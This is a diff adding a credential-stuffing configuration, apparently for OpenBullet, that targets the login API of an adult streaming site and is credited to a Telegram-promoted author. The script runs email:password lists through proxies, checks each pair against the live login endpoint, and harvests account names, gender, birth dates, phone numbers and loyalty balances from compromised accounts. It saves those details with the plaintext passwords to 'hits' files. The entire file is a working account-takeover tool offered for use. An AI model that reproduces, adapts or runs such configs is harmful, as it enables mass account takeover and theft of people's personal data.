@@ -1,0 +1,142 @@
+[SETTINGS]
+{
+  "Name": "Brazzers Plus",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-18T15:40:44.5022571+02:00",
+  "AdditionalInfo": "",
+  "Author": "@Config_FR",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "t.me/Config_FR",
+      "VariableName": "",
+      "Id": 424685632
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "gd" 
+
+REQUEST POST "https://www.brazzersplus.com/ums-server/api/o/session/login/password" 
+  CONTENT "{\"ApplicationUID\":\"<gd>\",\"Duration\":43200,\"OS\":\"web\",\"Locale\":\"en\",\"EmailAddress\":\"<USER>\",\"Password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.brazzersplus.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 159" 
+  HEADER "X-Tenant: brazzersplus" 
+  HEADER "Origin: https://www.brazzersplus.com" 
+  HEADER "Authorization: 2021-05-18T12:53:27.705Z|788c9779026a86017996eb38420b58a5" 
+  HEADER "Referer: https://www.brazzersplus.com/" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+REQUEST POST "https://www.brazzersplus.com/ums-server/api/u/user/profile/read?IncludeProperties=true" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.brazzersplus.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Tenant: brazzersplus" 
+  HEADER "Origin: https://www.brazzersplus.com" 
+  HEADER "Authorization: Ruh2-ig39x4V-NdJAyXcI15E" 
+  HEADER "Referer: https://www.brazzersplus.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 99" 
+
+#Account_Name PARSE "<SOURCE>" JSON "AccountName" CreateEmpty=FALSE -> CAP "Account Name" 
+
+#Gender PARSE "<SOURCE>" JSON "Gender" -> VAR "Gende" 
+
+FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "0" VALUE "Male" 
+  KEY "1" VALUE "Female" 
+  "<Gende>" -> CAP "Gender" 
+
+#Birthday PARSE "<SOURCE>" JSON "DateOfBirth" CreateEmpty=FALSE -> CAP "Date Of Birth" 
+
+#Phone_Number PARSE "<SOURCE>" JSON "PhoneNumber" CreateEmpty=FALSE -> CAP "Phone Number" 
+
+REQUEST GET "https://www.brazzersplus.com/octopus-server/api/u/fetch/mainLoyalty" 
+  
+  HEADER "Host: www.brazzersplus.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Tenant: brazzersplus" 
+  HEADER "Origin: https://www.brazzersplus.com" 
+  HEADER "Authorization: Ruh2-ig39x4V-NdJAyXcI15E" 
+  HEADER "Referer: https://www.brazzersplus.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 99" 
+
+#ZZ_Coins PARSE "<SOURCE>" JSON "TotalAvailable" CreateEmpty=FALSE -> CAP "ZZ Coins" 
+
+#Level PARSE "<SOURCE>" JSON "PointLevelName" CreateEmpty=FALSE -> CAP "Level" 
+
+FUNCTION Constant "@Config_FR" -> CAP "Telegram" 
+
+#Without UTILITY File "Brazzers Plus Without Coins.txt" AppendLines "=============@Config_FR=============\\r\\n[+] Email : <USER>\\r\\n[+] Password : <PASS>\\r\\n[+] Account Name : <Account Name>\\r\\n[+] Gender : <Gender>\\r\\n[+] Date Of Birth : <Date Of Birth> \\r\\n[+] Phone Number : <Phone Number>" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<ZZ Coins>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<ZZ Coins>" GreaterThan "0" 
+
+#With_ UTILITY File "Brazzers Plus With Coins.txt" AppendLines "=============@Config_FR=============\\r\\n[+] Email : <USER>\\r\\n[+] Password : <PASS>\\r\\n[+] Account Name : <Account Name>\\r\\n[+] Gender : <Gender>\\r\\n[+] Date Of Birth : <Date Of Birth> \\r\\n[+] Phone Number : <Phone Number>\\r\\n[+] ZZ Coins : <ZZ Coins>\\r\\n[+] Level : <Level>" 
+
